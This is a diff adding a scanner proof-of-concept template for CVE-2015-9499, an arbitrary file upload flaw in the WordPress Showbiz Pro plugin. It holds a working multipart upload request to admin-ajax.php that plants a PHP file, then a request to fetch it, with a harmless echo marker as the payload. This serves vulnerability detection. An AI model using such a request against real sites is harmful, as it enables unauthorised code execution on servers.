@@ -1,0 +1,61 @@
+[info]
+author = "ave"
+description = "通过 admin-ajax.php 上传包含恶意 PHP 文件的 ZIP 压缩包，验证文件是否成功上传并可执行"
+id = "POC-AVE-2015-0071"
+name = "WordPress Showbiz Pro <= 1.7.1 任意文件上传远程代码执行 PoC"
+severity = "critical"
+tags = ["ave-2015-0071"]
+vuln_id = [
+    "CVE-2015-9499",
+    "AVE-2015-0071",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg\r
+Content-Disposition: form-data; name="action"\r
+\r
+showbiz_ajax_action\r
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg\r
+Content-Disposition: form-data; name="client_action"\r
+\r
+update_plugin\r
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg\r
+Content-Disposition: form-data; name="update_file"; filename="{{randstr}}.zip"\r
+Content-Type: application/zip\r
+\r
+{{zip('{{randstr}}.php','<?php echo "AVETEST"; ?>')}}\r
+------WebKitFormBoundaryWJDMjlXCUnC1rnZg--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryWJDMjlXCUnC1rnZg"
+X-Requested-With = "XMLHttpRequest"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Update in progress",
+    "admin.php?page=showbiz&view=sliders",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wp-content/plugins/showbizpro/temp/update_extract/{{randstr}}.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVETEST"]
